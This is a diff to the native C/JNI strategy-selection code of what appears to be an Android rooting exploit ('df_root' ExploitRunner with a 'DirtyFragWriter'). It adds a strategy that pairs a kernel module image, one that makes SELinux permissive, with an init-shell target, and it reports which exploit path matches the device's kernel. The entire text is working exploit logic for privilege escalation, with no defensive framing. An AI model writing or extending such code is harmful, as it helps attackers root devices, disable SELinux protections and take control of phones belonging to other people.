@@ -13,6 +13,7 @@ enum NativeStrategy {
     STRATEGY_MODULE = 1,
     STRATEGY_PATCH_WINDOW = 2,
     STRATEGY_INIT_SHELL = 3,
+    STRATEGY_MODULE_INIT = 4,
 };
 
 static int configure_writer(JNIEnv *env, struct DirtyFragWriter *writer,
@@ -47,13 +48,28 @@ Java_df_root_ExploitRunner_nativeSelectStrategy(
     struct Reporter reporter_storage = {.env = env, .obj = reporter_object};
     struct Reporter *reporter = &reporter_storage;
     int android_release = 0, kernel_major = 0, kernel_minor = 0;
-    if (read_device_versions(&android_release,
-                             &kernel_major, &kernel_minor) == 0) {
-        if (select_ko_image(android_release, kernel_major, kernel_minor)) {
-            REPORTLN("strategy candidate: exact KMI android%d-%d.%d module; runtime carrier checks pending",
-                     android_release, kernel_major, kernel_minor);
+    const struct KoImage *image = select_runtime_ko_image();
+    if (image) {
+        if (image->kernel_release)
+            REPORTLN("strategy candidate: exact kernel module %s release=%s; runtime carrier checks pending",
+                     image->id, image->kernel_release);
+        else
+            REPORTLN("strategy candidate: exact KMI %s module; runtime carrier checks pending",
+                     image->id);
+        if (image->completion == KO_MAKES_SELINUX_PERMISSIVE) {
+            const struct InitTarget *init_target = find_init_target(reporter);
+            if (init_target) {
+                REPORTLN("strategy match: composed module plus init shell targets %s + %s",
+                         image->id, init_target->id);
+                return STRATEGY_MODULE_INIT;
+            }
+            REPORTLN("module strategy rejected: %s needs an exact init-shell follow-up",
+                     image->id);
+        } else {
             return STRATEGY_MODULE;
         }
+    } else if (read_device_versions(&android_release,
+                                    &kernel_major, &kernel_minor) == 0) {
         REPORTLN("module strategy rejected: no exact android%d-%d.%d image",
                  android_release, kernel_major, kernel_minor);
     } else {
